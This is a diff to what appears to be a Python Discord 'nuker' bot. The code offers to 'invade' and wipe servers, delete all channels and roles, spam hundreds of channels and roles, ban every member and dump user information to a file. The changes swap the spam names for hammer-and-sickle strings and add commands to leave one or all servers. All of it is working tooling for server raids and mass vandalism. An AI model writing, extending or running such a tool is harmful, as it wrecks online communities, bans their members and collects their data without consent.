@@ -102,7 +102,7 @@ async def on_ready():
                 for maxChannels in range(501):
                     # noinspection PyBroadException
                     try:
-                        await guild.create_text_channel('spamspamspam')
+                        await guild.create_text_channel('☭☭☭☭☭☭☭☭☭☭☭☭☭☭')
                         var4 += 1
                         print(f"Current ammount of channels created: {var4}")
                     except Exception:
@@ -113,7 +113,7 @@ async def on_ready():
                 for maxRoles in range(251):
                     # noinspection PyBroadException
                     try:
-                        await guild.create_role(name='spamspamspam')
+                        await guild.create_role(name='☭☭☭☭☭☭☭☭☭☭☭☭☭☭')
                         print(f"Current ammount of roles created: {var5}")
                     except Exception:
                         break
@@ -158,7 +158,7 @@ async def on_ready():
                 var1 = 0
                 for i in range(501):
                     try:
-                        await guild.create_text_channel('spamspamspam')
+                        await guild.create_text_channel('☭☭☭☭☭☭☭☭☭☭☭☭☭☭')
                         var1 += 1
                         print(f"Current ammount of created channels: {var1}")
                     except Exception:
@@ -188,7 +188,7 @@ async def on_ready():
                 var1 = 0
                 for i in range(251):
                     try:
-                        await guild.create_role(name='spamspamspam')
+                        await guild.create_role(name='☭☭☭☭☭☭☭☭☭☭☭☭☭☭')
                         var1 += 1
                         print(f"Current ammount of created roles: {var1}")
                     except Exception:
@@ -303,11 +303,22 @@ async def on_ready():
                         x += 1
                         print(x)
 
+    async def leaveguild():
+        id0 = int(input("Server ID: "))
+        for guild in client.guilds:
+            if guild.id == id0:
+                await guild.leave()
+
+    async def leaveall():
+        id0 = int(input("Server ID: "))
+        for guild in client.guilds:
+            await guild.leave()
+
     async def user_prompt():
         while True:
             print("Options:\n[1]botstat\n[2]channeldump (dumps channels into a local file)\n[3]userdump (dumps "
                   "userinfo into a local file)\n[4]invade (nukes a server entirely (LOL))\n[41]Delete all channels\n[42]Create 500 channels\n[43]Delete all roles\n[44]Create 250 roles\n[5]Ban a member\n[51]Ban all members\n[52]Unban "
-                  "a member\n[53]Unban ALL members\n[54]List all banned members\n[6]Get Rickrolled")
+                  "a member\n[53]Unban ALL members\n[54]List all banned members\n[6]Get Rickrolled\n[7]Leave a guild with the bot\n[71]Leave all guild with the bot")
             command = input(">> ")
             if command == "1":
                 botstat()
@@ -337,6 +348,10 @@ async def on_ready():
                 await listbans()
             elif command == "6":
                 await rickroll()
+            elif command == "7":
+                await leaveguild()
+            elif command == "71":
+                await leaveall()
 
     if __name__ == '__main__':
         await user_prompt()
